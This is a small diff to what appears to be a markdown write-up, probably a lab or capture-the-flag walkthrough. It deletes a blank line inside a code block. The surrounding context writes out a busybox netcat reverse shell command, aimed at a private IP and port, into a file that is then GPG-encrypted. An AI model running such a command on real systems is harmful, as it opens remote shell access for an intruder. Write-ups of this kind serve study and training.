@@ -158,7 +158,6 @@ I created a file containing a **reverse shell command**:
 
 ```
 echo -n "busybox nc  10.23.31.32 4242 -e sh" > command
-
 ```
 Then the file has been encrypted using GPG with AES-256 encryption:
 ```
